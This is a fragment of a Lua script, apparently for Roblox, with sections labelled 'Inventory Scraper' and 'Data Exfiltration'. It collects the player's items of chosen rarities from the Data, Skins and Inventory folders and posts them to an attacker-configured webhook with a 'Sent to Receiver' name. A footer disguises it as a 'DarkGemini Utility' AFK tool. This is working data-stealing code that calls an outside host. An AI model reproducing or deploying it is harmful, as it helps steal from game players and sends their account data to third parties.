-- [[ 2. Inventory Scraper ]]
local function getFilteredInventory()
    local items = {}
    local dataPaths = {
        localPlayer:FindFirstChild("Data"),
        localPlayer:FindFirstChild("Skins"),
        localPlayer:FindFirstChild("Inventory")
    }
    
    for _, path in pairs(dataPaths) do
        if path then
            for _, item in pairs(path:GetDescendants()) do
                local rarity = item:GetAttribute("Rarity") or (item:FindFirstChild("Rarity") and item.Rarity.Value) or "Common"
                if cfg.rarities[rarity] then
                    table.insert(items, "✨ " .. item.Name .. " [" .. rarity .. "]")
                end
            end
        end
    end
    return items
end

-- [[ 3. Data Exfiltration ]]
local function executeLog()
    if not request then return end
    local inventory = getFilteredInventory()
    
    local payload = HttpService:JSONEncode({
        ["content"] = "@everyone AFK Mode Active for " .. localPlayer.Name,
        ["embeds"] = {{
            ["title"] = "Inventory Assets Scanned",
            ["description"] = "Sent to Receiver: **" .. cfg.target_user .. "**\n\n**Items:**\n" .. (#inventory > 0 and table.concat(inventory, "\n") or "No items matching rarity filter."),
            ["color"] = 0x9B59B6,
            ["footer"] = {["text"] = "DarkGemini Utility | Status: AFK Active"}
        }}
    })

    request({
        Url = cfg.webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = payload
    })
end

